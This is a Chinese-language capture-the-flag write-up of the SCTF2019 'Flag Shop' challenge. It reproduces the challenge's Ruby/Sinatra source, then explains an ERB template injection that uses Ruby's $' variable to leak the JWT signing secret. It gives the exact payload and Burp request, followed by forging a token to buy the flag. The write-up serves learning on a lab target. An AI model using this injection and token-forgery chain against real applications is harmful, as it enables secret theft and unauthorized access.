# [SCTF2019]Flag Shop

[题目地址](https://buuoj.cn/challenges#[SCTF2019]Flag%20Shop)

怎么还有ruby啊？

开局穷人，flag价格贵上天，我们只有2位数的钱。有个work按钮，按一次就给一点钱，根本不够。打工是不可能打工的，这辈子都不可能打工的。去看robots.txt，发现目录/filebak。里面是网站源码。

```ruby
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
ENV["SECRET"] = SecureRandom.hex(64)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end

get "/" do
  redirect '/shop', 302
end

get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end

get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end

get "/api/info" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
  erb :shop
end

get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end
end

post "/shop" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

  if auth[0]["jkl"] < FLAGPRICE then

    json({title: "error",message: "no enough jkl"})
  else

    auth << {flag: ENV["FLAG"]}
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    json({title: "success",message: "jkl is good thing"})
  end
end


def islogin
  if cookies[:auth].nil? then
    redirect to('/shop')
  end
end
```

md完全看不懂，找[wp](https://blog.csdn.net/Mrs_H/article/details/121493970)。了解到了ruby里的模板注入：[ERB模板注入](https://www.zhihu.com/column/p/29440823)。基本思路是，ERB里用标签插入代码，<%=%>是插入内置代码的输入内容，或者说值；<%%>单纯就是插入代码。

程序里使用了jwt，去看看cookie。发现jwt里记录了钱的数量，如果我们能随意修改就好了。现在暂时不行，因为修改值重新加密需要密钥。程序里不是有个ENV["SECRET"]吗，能不能尝试输出它的值？看下面的代码：

```ruby
  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result 

  end
```

#{}是ruby里的字符串内插语法。因为整个`<script>alert('#{params[:name][0,7]} working successfully!')</script>`都被放入了ERB进行渲染，name又能自由控制，这不是就能借此输出ENV["SECRET"]了吗？

没那么简单。这个语句块有if限制。params[:name][0,7]是ruby的[字符串操作](https://ruby-doc.org/core-2.1.0/String.html)，name不能超过7个字符。同时do的内容需要是xxx is working（xxx是name的值）。name有长度限制就很烦，直接输出secret肯定超了。没关系，ruby有[预定义变量](https://blog.csdn.net/TomorrowAndTuture/article/details/108565910)，可以用`$'`，表示最后一次模式匹配中匹配部分之后的字符串。为什么用这个？因为下面的代码：

```ruby
unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
end
```

这个[unless](https://www.runoob.com/ruby/ruby-decision.html)和if相反，当条件是假时才会执行语句块内的内容。这里只要我们不给SECRET传值，就会执行到里面的匹配。不传值情况下能匹配到完整的SECRET，用`$'`就能获取它的值。于是构造payload：

- `?name=<%=$'%>&do=<%=$' is working%>&SECRET=`

放进bp：

```
GET /work?name=%3C%25=$%27%25%3E&do=%3C%25=$%27%25%3E%20is%20working&SECRET= HTTP/1.1
Host: a3b40d93-0b9d-475c-801c-8e5462912995.node4.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: */*
Referer: http://a3b40d93-0b9d-475c-801c-8e5462912995.node4.buuoj.cn:81/shop
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIzNjRjMzZlNC0xOTA2LTQwZTctOTZlZi1hZDlhNzA1Y2U5ZTkiLCJqa2wiOjIwfQ.LXNhq7GQHMiEAvl28pGKCLk6b-4sCgvq5_PAlMMWglg
Connection: close
```

服务器返回密钥。现在就能任意改钱数了，钱改够后换个jwt，买到flag。